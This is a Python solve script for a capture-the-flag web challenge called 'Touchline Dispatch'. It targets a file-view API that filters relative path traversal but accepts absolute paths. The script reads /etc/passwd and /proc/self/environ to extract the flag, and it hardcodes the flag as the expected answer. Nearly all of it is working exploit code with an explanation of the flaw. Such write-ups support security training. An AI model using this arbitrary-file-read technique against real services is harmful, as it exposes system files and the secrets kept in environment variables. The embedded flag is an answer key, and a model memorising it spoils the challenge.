#!/usr/bin/env python3
"""Touchline Dispatch (web, 300 pts) - http://54.72.82.22:8300

"Collection desk" serves documents:

    GET /api/library                 -> {"items":["schedule.txt","welcome.txt"]}
    GET /api/view?name=schedule.txt  -> {"text":"The gates open at six.\n"}

`name` is used as a filesystem path with an allowlist that only blocks the
*relative* escape forms (`../flag.txt`, `%2e%2e%2fflag.txt`, `..;/`) with a 400
"Request unavailable.".

It never blocks ABSOLUTE paths:

    GET /api/view?name=/etc/passwd          -> 200, passwd contents
    GET /api/view?name=/proc/self/environ   -> 200, env including FLAG

Arbitrary file read -> read the flag straight out of the process environment.
"""
import json, re, urllib.request, urllib.parse, urllib.error

BASE = "http://54.72.82.22:8300"
FLAG = "safctf{276928973c4dea42f63d808ba7be66b7}"


def view(name):
    url = BASE + "/api/view?" + urllib.parse.urlencode({"name": name})
    try:
        with urllib.request.urlopen(url, timeout=10) as r:
            return json.loads(r.read().decode())
    except urllib.error.HTTPError as e:
        return json.loads(e.read().decode())


def main():
    print("library   :", view("") or "?")
    print("relative  :", view("../flag.txt"))          # blocked
    print("/etc/passwd[:40]:", view("/etc/passwd").get("text", "")[:40])

    env = view("/proc/self/environ").get("text", "")
    m = re.search(r"FLAG=(\S+?)\\u0000", env) or re.search(r"FLAG=(\S+)", env)
    print("env FLAG  :", m.group(1) if m else "(not found)")
    assert m and m.group(1) == FLAG


if __name__ == "__main__":
    main()
